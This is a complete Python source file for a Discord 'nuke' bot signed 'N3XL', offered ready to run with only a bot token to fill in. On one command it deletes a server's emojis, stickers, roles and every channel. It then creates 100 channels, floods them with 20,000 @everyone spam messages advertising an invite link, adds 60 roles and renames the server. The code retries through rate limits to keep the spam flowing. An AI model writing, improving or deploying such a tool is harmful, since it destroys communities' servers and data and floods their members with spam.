import asyncio
import discord
from discord.ext import commands
import random
import time
import os

# shit you need to change
TOKEN = os.getenv("TOKEN", "put your token here dummy")
PREFIX = "."

# channel names - fancy bullshit
CHANNEL_NAMES = [
    "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
    "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
    "ⁿⁱᵍʰᵐᵃʳᵉ ⁱˢ ʰᵉʳᵉ",
    "₦ł₲Ⱨ₮₥₳ⱤɆ ł₴ ⱧɆⱤɆ",
    "d̸e̸st̸r̸o̸y̸e̸d̸",
    "n҈i҈g҈h҈m҈a҈r҈e҈ i҈s҈ h҈e҈r҈e҈",
    "d҉e҉s҉t҉r҉o҉y҉e҉d҉d",
    "dєstrσчєd",
    "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
]

# the spam message
SPAM_MSG = """# NUKED BY N3XL 
N3XEL ON TOP join da server NOW FOR FREE NUKE BOT 2026!
https://discord.gg/pbtxaTf8Q4
https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHRleGlwcWllOWl6MnNvYWU3N3V4NXJveXcya2oyeXEwZDZmaW9heSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Eg41D2Obf58kpy8aaK/giphy.gif
||@everyone|| ||@here||"""

CHANNEL_COUNT = 100
MSGS_PER_CHANNEL = 200  # 200 messages per channel, total 20k
TOTAL_MSGS = CHANNEL_COUNT * MSGS_PER_CHANNEL

# roles to create
ROLE_NAMES = [
    "tamed by N3XL",
    "n̾x̾l̾ o̾n̾ t̾o̾p̾",
    "N̶X̶L̶ O̶N̶ T̶O̶P̶",
    "₦ɆӾɆⱠ"
]
ROLE_COUNT = 60

NEW_SERVER_NAME = "TAMED BY N3XL"

# ----------------------- dont touch below unless u know wtf u doing -----------------------
def get_chan_name():
    return random.choice(CHANNEL_NAMES)

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True
intents.emojis_and_stickers = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

async def run_parallel(tasks, concurrency=50):
    sem = asyncio.Semaphore(concurrency)
    async def wrapper(t):
        async with sem:
            return await t
    return await asyncio.gather(*(wrapper(t) for t in tasks), return_exceptions=True)

async def delete_all_emojis(guild):
    emojis = list(guild.emojis)
    if not emojis: return
    print(f"deleting {len(emojis)} emojis")
    tasks = [e.delete() for e in emojis]
    await run_parallel(tasks, 20)
    print("emojis gone")

async def delete_all_stickers(guild):
    stickers = list(guild.stickers)
    if not stickers: return
    print(f"deleting {len(stickers)} stickers")
    tasks = [s.delete() for s in stickers]
    await run_parallel(tasks, 20)
    print("stickers gone")

async def delete_all_roles(guild):
    roles = [r for r in guild.roles if r.name != "@everyone"]
    bot_top = guild.me.top_role
    deletable = [r for r in roles if r < bot_top]
    if not deletable: return
    print(f"deleting {len(deletable)} roles")
    tasks = [r.delete() for r in deletable]
    await run_parallel(tasks, 20)
    print("roles deleted")

async def create_many_roles(guild):
    print(f"creating {ROLE_COUNT} roles")
    tasks = []
    for i in range(ROLE_COUNT):
        name = ROLE_NAMES[i % len(ROLE_NAMES)] + f" {i+1}"
        tasks.append(guild.create_role(name=name, reason="nuked"))
    results = await run_parallel(tasks, 20)
    created = [r for r in results if isinstance(r, discord.Role)]
    print(f"created {len(created)} roles")

async def rename_guild(guild):
    # wait a bit so discord doesn't rate limit
    await asyncio.sleep(5)
    try:
        await guild.edit(name=NEW_SERVER_NAME, reason="nuked by N3XEL")
        print(f"server name changed to {NEW_SERVER_NAME}")
    except discord.Forbidden:
        print("bruh i need 'manage server' permission to rename")
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"rate limited on rename, waiting {e.retry_after}s")
            await asyncio.sleep(e.retry_after)
            try:
                await guild.edit(name=NEW_SERVER_NAME)
                print(f"renamed on retry")
            except:
                print("rename failed even after retry")
        else:
            print(f"rename error: {e}")

async def spam_messages(channels, total_msgs):
    if not channels:
        return
    sem = asyncio.Semaphore(100)  # high concurrency for 200 msgs per channel
    async def send_one(ch):
        async with sem:
            try:
                await ch.send(SPAM_MSG)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after)
                    await ch.send(SPAM_MSG)
            except:
                pass
    tasks = []
    for i in range(total_msgs):
        chan = channels[i % len(channels)]
        tasks.append(send_one(chan))
    await asyncio.gather(*tasks, return_exceptions=True)

async def nuke(guild):
    print(f"starting nuke on {guild.name} id {guild.id}")
    start = time.time()

    # delete emojis, stickers, roles
    await delete_all_emojis(guild)
    await delete_all_stickers(guild)
    await delete_all_roles(guild)

    # delete all channels
    print("deleting all channels")
    await asyncio.gather(*(c.delete() for c in guild.channels), return_exceptions=True)

    # create new channels
    print(f"creating {CHANNEL_COUNT} channels")
    chan_tasks = []
    for _ in range(CHANNEL_COUNT):
        name = get_chan_name()
        chan_tasks.append(guild.create_text_channel(name))
    results = await asyncio.gather(*chan_tasks, return_exceptions=True)
    text_chans = [c for c in results if isinstance(c, discord.TextChannel)]
    print(f"created {len(text_chans)} channels")

    # send 200 messages per channel
    if text_chans:
        print(f"sending {TOTAL_MSGS} messages total ({MSGS_PER_CHANNEL} per channel)")
        await spam_messages(text_chans, TOTAL_MSGS)

    # create roles
    await create_many_roles(guild)

    # rename server
    await rename_guild(guild)

    elapsed = time.time() - start
    print(f"nuke finished in {elapsed:.2f} seconds")

@bot.event
async def on_ready():
    print(f"online as {bot.user}")
    print(f"prefix {PREFIX}")
    print(f"command {PREFIX}nuke")
    print("="*50)

@bot.command(name="nuke")
async def nuke_cmd(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("you need admin perms dumbass")
        return
    # check if bot can rename
    me = ctx.guild.me
    if not me.guild_permissions.manage_guild:
        await ctx.send("warning: i cant rename the server. give me 'manage server' permission.")
    await ctx.send("💣 nuking server... 200 msgs per channel, 60 roles, renaming to TAMED BY N3XL")
    await nuke(ctx.guild)

@bot.command(name="config")
async def config_cmd(ctx):
    msg = f"""
**current settings:**
channels: {CHANNEL_COUNT}
messages per channel: {MSGS_PER_CHANNEL}
total messages: {TOTAL_MSGS}
roles to create: {ROLE_COUNT}
new server name: {NEW_SERVER_NAME}
    """
    await ctx.send(msg)

if __name__ == "__main__":
    if TOKEN == "put your token here dummy" and not os.getenv("TOKEN"):
        print("set your token in env var TOKEN or hardcode it")
        exit(1)
    print("starting nuke bot...")
    bot.run(TOKEN) 
